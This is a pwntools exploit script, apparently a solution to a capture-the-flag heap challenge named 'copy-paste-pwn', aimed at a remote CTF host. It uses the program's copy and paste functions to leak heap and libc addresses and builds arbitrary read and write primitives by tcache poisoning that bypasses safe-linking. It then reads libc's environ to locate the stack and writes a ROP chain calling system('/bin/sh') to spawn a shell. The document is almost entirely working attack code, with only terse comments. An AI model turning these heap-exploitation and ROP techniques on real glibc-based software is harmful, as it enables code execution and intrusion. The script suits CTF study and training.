import sys

from pwn import *

elf = ELF("chall")
libc = ELF("libc.so.6")

# io = process(elf.path, env = {"LD_PRELOAD":"./libc.so.6"})
io = remote("copy-paste-pwn.wanictf.org", 9009)

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]

largebin_oft = 0x21A0D0
pop_rdi_ret_oft = 0x2A3E5
ret_oft = 0x29CD6


def choice(c):
    io.sendlineafter(b"choice: ", c)


def create(idx, sz, ctx):
    choice(b"1")
    io.sendlineafter(b": ", idx)
    io.sendlineafter(b": ", sz)
    io.sendlineafter(b": ", ctx)


def show(idx):
    choice(b"2")
    io.sendlineafter(b": ", idx)
    r = io.recvuntil(b"\n----")
    return r[:-5]


def copy(idx):
    choice(b"3")
    io.sendlineafter(b": ", idx)


def paste(idx):
    choice(b"4")
    io.sendlineafter(b": ", idx)


def delete(idx):
    choice(b"5")
    io.sendlineafter(b": ", idx)


def exit():
    choice(b"6")


#######################
# some addresses leak #
#######################

# heap addr leak
create(b"0", b"8", b"AAA")
create(b"1", b"24", b"\x00")
copy(b"0")
delete(b"0")
paste(b"1")
r = show(b"1")
heap_addr = u64(r[0:5] + b"\x00\x00\x00") << 12
print("heap addr: " + str(hex(heap_addr)))

# libc addr leak
create(b"2", b"1050", b"AAA")
create(b"3", b"32", b"\x00")
copy(b"2")
delete(b"2")
paste(b"3")
r = show(b"3")
libc.address = u64(r[0:6] + b"\x00\x00") - largebin_oft
print("libc addr: " + str(hex(libc.address)))


###############################
# define additional functions #
###############################


def safe_linking(addr):
    return p64(addr ^ (heap_addr >> 12))


def aaw(addr, ctx):
    # require: tcache bins with size 0x20 & 0x30 is empty
    create(b"0", b"16", b"A" * 15 + b"\x41")
    create(b"1", b"24", b"A" * 24)
    create(b"2", b"40", b"AAA")
    create(b"3", b"16", b"AAA")
    create(b"4", b"40", b"AAA")
    delete(b"2")
    copy(b"0")
    paste(b"1")
    delete(b"3")
    delete(b"1")
    delete(b"4")
    create(b"3", b"56", b"A" * 24 + p64(0x31) + safe_linking(addr))
    create(b"4", b"40", b"AAA")
    create(b"1", b"40", ctx)


def aar(addr):
    # require: tcache bins with size 0x20 & 0x30 is empty
    create(b"0", b"16", b"A" * 15 + b"\x41")
    create(b"1", b"24", b"A" * 24)
    create(b"2", b"40", b"AAA")
    create(b"3", b"16", b"AAA")
    create(b"4", b"16", b"AAA")
    delete(b"2")
    copy(b"0")
    paste(b"1")
    delete(b"3")
    delete(b"4")
    create(b"3", b"56", b"A" * 24 + p64(0x31) + safe_linking(addr))
    create(b"4", b"16", b"\x00")
    create(b"1", b"0", b"")
    copy(b"1")
    paste(b"4")
    return show(b"4")


##############
# stack leak #
##############

# clear some tcache bins
create(b"0", b"8", b"AAA")
create(b"1", b"8", b"AAA")
create(b"2", b"32", b"AAA")

# read variable "environ" in libc
r = aar(libc.sym["environ"])
stack_ret_addr = u64(r[0:8]) - 0x120
print("main()'s return address is at " + str(hex(stack_ret_addr)))


#####################
# create ROP chains #
#####################

# clear tcache bin
create(b"2", b"32", b"AAA")

# align chunk address
stack_ret_addr_aligned = stack_ret_addr & 0xFFFFFFFFFFFFFFF0

# ROP chains
payload = p64(libc.address + pop_rdi_ret_oft)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.address + ret_oft)
payload += p64(libc.sym["system"])

if stack_ret_addr_aligned != stack_ret_addr:
    payload = b"A" * 8 + payload

# write the payload in stack
aaw(stack_ret_addr_aligned, payload)

# go!
exit()

io.interactive()
